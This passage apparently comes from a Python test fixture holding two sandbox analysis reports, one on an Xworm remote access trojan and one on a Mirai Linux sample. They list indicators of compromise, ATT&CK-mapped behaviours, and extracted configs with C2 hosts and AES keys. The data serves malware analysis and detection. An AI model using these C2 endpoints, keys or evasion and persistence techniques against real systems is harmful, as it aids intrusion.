                    "8.8.8.8.in-addr.arpa",
                    "registry.npmjs.org",
                    "34.30.16.104.in-addr.arpa",
                    "ip-api.com",
                    "1.112.95.208.in-addr.arpa",
                    "196.249.167.52.in-addr.arpa",
                    "73.159.190.20.in-addr.arpa",
                    "88.210.23.2.in-addr.arpa",
                    "95.221.229.192.in-addr.arpa",
                    "57.110.18.2.in-addr.arpa",
                    "rentry.co",
                    "shoes-since.gl.at.ply.gg",
                    "completed-rally.gl.at.ply.gg",
                    "16.3.26.104.in-addr.arpa",
                    "george-liechtenstein.gl.at.ply.gg",
                ],
                "ips": [
                    "8.8.8.8",
                    "104.16.30.34",
                    "208.95.112.1",
                    "104.26.3.16",
                    "147.185.221.23",
                    "147.185.221.22",
                    "147.185.221.19",
                ],
            },
        }
    ],
    "signatures": [
        {
            "name": "Detect Xworm Payload",
            "score": 10,
            "indicators": [
                {
                    "resource": "behavioral2/memory/3652-2770-0x0000000000D40000-0x0000000000D58000-memory.dmp",
                    "yara_rule": "family_xworm",
                },
                {"resource": "behavioral2/files/0x00080000000249a4-2785.dat", "yara_rule": "family_xworm"},
                {
                    "resource": "behavioral2/memory/3200-2790-0x0000000000190000-0x00000000001A0000-memory.dmp",
                    "yara_rule": "family_xworm",
                },
                {"resource": "behavioral2/files/0x00080000000249a6-2805.dat", "yara_rule": "family_xworm"},
                {
                    "resource": "behavioral2/memory/4636-2812-0x0000000000D00000-0x0000000000D12000-memory.dmp",
                    "yara_rule": "family_xworm",
                },
                {"resource": "behavioral2/files/0x000a0000000249a9-2944.dat", "yara_rule": "family_xworm"},
            ],
        },
        {
            "label": "xworm",
            "name": "Xworm",
            "score": 10,
            "tags": ["trojan", "rat", "family:xworm"],
            "desc": "Xworm is a remote access trojan written in C#.",
        },
        {"name": "Xworm family", "score": 10, "tags": ["family:xworm"]},
        {
            "label": "powershell_hide",
            "name": "Command and Scripting Interpreter: PowerShell",
            "score": 8,
            "ttp": ["T1059.001"],
            "tags": ["execution"],
            "desc": "Run Powershell and hide display window.",
        },
        {"label": "fw_startup_file", "name": "Drops startup file", "score": 7},
        {
            "label": "creates_runkey_registry",
            "name": "Adds Run key to start application",
            "score": 6,
            "ttp": ["T1547.001", "T1112"],
            "tags": ["persistence"],
        },
        {
            "label": "file_drive_discovery",
            "name": "Enumerates connected drives",
            "score": 6,
            "ttp": ["T1012", "T1120", "T1082"],
            "desc": "Attempts to read the root path of hard drives other than the default C: drive.",
        },
        {
            "label": "powershell_hidden_window",
            "name": "Hide Artifacts: Hidden Window",
            "score": 6,
            "ttp": ["T1564.003"],
            "tags": ["defense_evasion"],
            "desc": "Windows that would typically be displayed when an application carries out an operation can be hidden.",
        },
        {
            "label": "external_ip_lookup",
            "name": "Looks up external IP address via web service",
            "score": 6,
            "desc": "Uses a legitimate IP lookup service to find the infected system's external IP.",
        },
        {
            "label": "reg_checks_country_code",
            "name": "Checks computer location settings",
            "score": 5,
            "ttp": ["T1012", "T1082"],
            "desc": "Looks up country code configured in the registry, likely geofence.",
        },
        {"label": "fw_system32", "name": "Drops file in System32 directory", "score": 5},
        {"label": "fw_programfiles", "name": "Drops file in Program Files directory", "score": 4},
        {"label": "fw_windows", "name": "Drops file in Windows directory", "score": 4},
        {"name": "Executes dropped EXE", "score": 4},
        {"name": "Loads dropped DLL", "score": 4},
        {
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
            "desc": "Attempts to interact with connected storage/optical drive(s).",
        },
        {
            "label": "install_packages_msi",
            "name": "Event Triggered Execution: Installer Packages",
            "score": 3,
            "ttp": ["T1546.016", "T1218.007"],
            "tags": ["persistence", "privilege_escalation"],
        },
        {
            "label": "system_language_discovery",
            "name": "System Location Discovery: System Language Discovery",
            "score": 3,
            "ttp": ["T1614.001"],
            "tags": ["discovery"],
            "desc": "Attempt gather information about the system language of a victim in order to infer the geographical location of that host.",
        },
        {
            "label": "reg_system_enum",
            "name": "Checks SCSI registry key(s)",
            "ttp": ["T1012", "T1120", "T1082"],
            "desc": "SCSI information is often read in order to detect sandboxing environments.",
        },
        {"label": "reg_hku_write", "name": "Modifies data under HKEY_USERS"},
        {"label": "reg_software_classes", "name": "Modifies registry class"},
        {
            "label": "schtasks_persist",
            "name": "Scheduled Task/Job: Scheduled Task",
            "ttp": ["T1053.005"],
            "tags": ["persistence", "execution"],
            "desc": "Schtasks is often used by malware for persistence or to perform post-infection execution.",
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious behavior: GetForegroundWindowSpam"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of FindShellTrayWindow"},
        {"name": "Suspicious use of SendNotifyMessage"},
        {"name": "Suspicious use of SetWindowsHookEx"},
        {"name": "Suspicious use of WriteProcessMemory"},
        {
            "label": "win_tasksched_com_clsid",
            "name": "Uses Task Scheduler COM API",
            "ttp": ["T1012"],
            "tags": ["persistence"],
            "desc": "The Task Scheduler COM API can be used to schedule applications to run on boot or at set times.",
        },
        {
            "label": "win_volshadow_com_clsid",
            "name": "Uses Volume Shadow Copy service COM API",
            "tags": ["ransomware"],
            "desc": "The Volume Shadow Copy service is used to manage backups/snapshots.",
        },
    ],
    "extracted": [
        {
            "tasks": ["behavioral2"],
            "dumped_file": "memory/3652-2770-0x0000000000D40000-0x0000000000D58000-memory.dmp",
            "resource": "behavioral2/memory/3652-2770-0x0000000000D40000-0x0000000000D58000-memory.dmp",
            "config": {
                "family": "xworm",
                "rule": "Xworm",
                "c2": ["completed-rally.gl.at.ply.gg:28996"],
                "attr": {"install_file": "Windows Data Compiler.exe", "Install_directory": "%LocalAppData%"},
            },
        },
        {
            "tasks": ["behavioral2"],
            "dumped_file": "memory/3200-2790-0x0000000000190000-0x00000000001A0000-memory.dmp",
            "resource": "behavioral2/memory/3200-2790-0x0000000000190000-0x00000000001A0000-memory.dmp",
            "config": {
                "family": "xworm",
                "rule": "Xworm",
                "c2": ["shoes-since.gl.at.ply.gg:49960", "george-liechtenstein.gl.at.ply.gg:2030"],
                "version": "5.0",
                "mutex": ["XnVPNFvj6qHEv6EY"],
                "keys": [
                    {"kind": "aes.plain", "key": "aes_key", "value": "epM79MOCPI/hJyFTizlqAQ=="},
                    {"kind": "aes.plain", "key": "aes_key", "value": "8OV26gon3KCCoHMj0+OWwQ=="},
                ],
                "attr": {"install_file": "WindowsAntivirus.exe", "Install_directory": "%AppData%"},
            },
        },
    ],
}

query_250106_fypb1azkcr = {
    "version": "0.3.0",
    "sample": {
        "id": "250106-fypb1azkcr",
        "score": 10,
        "target": "res.x86.elf",
        "size": 21084,
        "md5": "0f1de9ef58d6326904a0eed4fa21c717",
        "sha1": "17f212986484b2f4ffee32255d761cb7cdeb9595",
        "sha256": "e6b864387607633fb94de8e2b053ed80b338c9f6c95ef2501e7a59062fe69cfb",
        "sha512": "3fa6a8079ab67501a676c11d04a7f4207a3eb6a32dfc73d4d05c935c52c0135f1f167edbaf7b3c8b34150f016e14fcbf809bfeb7bf58e17855e1b59c3b5e1726",
        "ssdeep": "384:fhP0EbY0HbPn4kRwAzE5OX8OR6OxS1LJ+RX9STzLXHQsVC3WNE:OkdfdwL6RsNJFTXXHdVZNE",
        "created": "2025-01-06T05:17:02Z",
        "completed": "2025-01-06T05:19:36Z",
    },
    "tasks": [
        {
            "sample": "250106-fypb1azkcr",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": ["rootkit"],
            "score": 7,
            "target": "res.x86.elf",
            "backend": "sbx4m72",
            "resource": "ubuntu2404-amd64-20240523-en",
            "os": "ubuntu-24.04-amd64",
            "timeout": 150,
            "sigs": 1,
        },
        {
            "sample": "250106-fypb1azkcr",
            "kind": "static",
            "name": "static1",
            "status": "reported",
            "tags": ["family:mirai"],
            "score": 10,
            "sigs": 1,
        },
    ],
    "analysis": {"score": 10, "family": ["mirai"], "tags": ["family:mirai", "linux", "rootkit"]},
    "targets": [
        {
            "tasks": ["behavioral1"],
            "score": 7,
            "target": "res.x86.elf",
            "size": 21084,
            "md5": "0f1de9ef58d6326904a0eed4fa21c717",
            "sha1": "17f212986484b2f4ffee32255d761cb7cdeb9595",
            "sha256": "e6b864387607633fb94de8e2b053ed80b338c9f6c95ef2501e7a59062fe69cfb",
            "sha512": "3fa6a8079ab67501a676c11d04a7f4207a3eb6a32dfc73d4d05c935c52c0135f1f167edbaf7b3c8b34150f016e14fcbf809bfeb7bf58e17855e1b59c3b5e1726",
            "ssdeep": "384:fhP0EbY0HbPn4kRwAzE5OX8OR6OxS1LJ+RX9STzLXHQsVC3WNE:OkdfdwL6RsNJFTXXHdVZNE",
            "tags": ["rootkit"],
            "signatures": [
                {
                    "name": "Loads a kernel module",
                    "score": 7,
                    "tags": ["rootkit"],
                    "desc": "Loads a Linux kernel module, potentially to achieve persistence",
                }
            ],
            "iocs": {"ips": ["224.0.0.251", "79.124.60.186"]},
        }
    ],
    "signatures": [
        {"name": "Mirai family", "score": 10, "tags": ["family:mirai"]},
        {
            "name": "Loads a kernel module",
            "score": 7,
            "tags": ["rootkit"],
            "desc": "Loads a Linux kernel module, potentially to achieve persistence",
        },
    ],
    "extracted": [
        {
            "tasks": ["static1"],
            "dumped_file": "res.x86.elf",
            "resource": "sample",
            "config": {"family": "mirai", "rule": "Mirai_x86"},
        }
    ],
}
